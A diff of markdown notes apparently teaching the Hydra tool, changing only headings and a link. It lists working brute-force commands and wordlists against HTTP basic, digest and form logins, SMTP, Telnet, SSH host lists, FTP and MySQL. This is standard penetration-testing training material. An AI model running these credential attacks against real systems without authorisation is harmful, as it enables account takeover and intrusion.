@@ -1,7 +1,7 @@
 
-# Hydra notes
+## Hydra notes
 
-https://medium.com/@joshthedev/step-10-login-brute-forcing-e709b4b60637
+- [Hydra Medium Article](https://medium.com/@joshthedev/step-10-login-brute-forcing-e709b4b60637)
 
 Hydra is a very useful software when it comes to bruteforce credentials on most commonly used protocols. We are going to start with some flags which are generally used independently from the protocol, so in the examples when we will see these flags, we can immediately understand what they are used for. Here is a list of common and general flags used with Hydra:
 
@@ -19,9 +19,9 @@ Hydra is a very useful software when it comes to bruteforce credentials on most 
 - `-f` this flag when activated, will let hydra terminate as soon as it finds a single correct credential pair, so as soon as it succeeds it exits, this happens per host if we specify -M (so a set of machines)
 - `-F` exits after the first found login/password pair for any host (for usage with -M)
 
-## [](https://github.com/gnebbia/hydra_notes#http)HTTP
+### HTTP
 
-### [](https://github.com/gnebbia/hydra_notes#http-basic-authentication)HTTP Basic Authentication
+### HTTP Basic Authentication
 
 We can use the following commands for Basic HTTP Authentication, we can understand that the authentication is basic from the headers of the response.
 
@@ -47,7 +47,7 @@ hydra -L users.txt -P words.txt www.site.com -e ns http-head /private/
 # of the users and with passwords equal to the username for each user
 ```
 
-### [](https://github.com/gnebbia/hydra_notes#http-digest-authentication)HTTP Digest Authentication
+### HTTP Digest Authentication
 
 ```shell
 hydra -l root -P test.txt -vV localhost http-get /forbidden-d2
@@ -65,7 +65,7 @@ hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /get
 # authentication at the path /get_camera_params.cgi
 ```
 
-### [](https://github.com/gnebbia/hydra_notes#http-forms)HTTP Forms
+### HTTP Forms
 
 When it comes to HTTP login forms, we generally have to inspect the web application, searching for messages which will appear on successful or failed logins.
 
@@ -105,7 +105,7 @@ hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=val
  # page:parameters:S=message_to_show_in_case_of_failure
 ```
 
-### [](https://github.com/gnebbia/hydra_notes#http-get-login-forms)HTTP Get Login Forms
+### HTTP Get Login Forms
 
 ```shell
 hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com \
@@ -118,7 +118,7 @@ hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists
 "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
 ```
 
-### [](https://github.com/gnebbia/hydra_notes#http-post-login-forms)HTTP Post Login Forms
+### HTTP Post Login Forms
 
 ```shell
 hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" \
@@ -159,7 +159,7 @@ hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-lo
 # the HTTP response
 ```
 
-## [](https://github.com/gnebbia/hydra_notes#smtp)SMTP
+### SMTP
 
 ```shell
 hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Desktop/rockyou.txt' -s portnumber -S -v 
@@ -167,13 +167,13 @@ hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Deskto
 
 Generally the port used for SMTP is 465 and common SMTP server for common email services are: * smtp.mail.yahoo.com * smtp.gmail.com * smtp.live.com (but on poort 587)
 
-## [](https://github.com/gnebbia/hydra_notes#telnet)Telnet
+### Telnet
 
 ```shell
 hydra -l <username> -P <password_file> telnet://targetname
 ```
 
-## [](https://github.com/gnebbia/hydra_notes#ssh)SSH
+### SSH
 
 ```shell
 hydra -l root -M /path/to/ip/list.txt -P /path/to/passwordlist.txt ssh -t 4
@@ -199,7 +199,7 @@ hydra -L logins.txt -P pws.txt -M targets.txt ssh
 # on all the machines listed on targests.txt on the ssh port/service
 ```
 
-## [](https://github.com/gnebbia/hydra_notes#ftp)FTP
+### FTP
 
 ```shell
 hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp
@@ -209,7 +209,7 @@ hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp
 hydra -l user -P passlist.txt ftp://192.168.0.1
 ```
 
-## [](https://github.com/gnebbia/hydra_notes#mysql-and-other-databases)MySQL and other databases
+### MySQL and other databases
 
 We can use hydra with many kinds of databases, anyway it is very important for us to check that we have installed hydra with the adequate module to perform a specific bruteforce.
 
@@ -227,7 +227,7 @@ hydra -L <your_username_file> -P <your_password_file> <IP> mysql -o output.txt
  # anyway it is fundamental to specify it if the mysql port is different
 ```
 
-## [](https://github.com/gnebbia/hydra_notes#appendix-a-sending-hydra-traffic-through-proxy)Appendix A: Sending Hydra traffic through Proxy
+### Appendix A: Sending Hydra traffic through Proxy
 
 It is often useful to analyze what we are actually doing with hydra, to this purpose we can send the traffic to an intercepting proxy such as Burp.
 
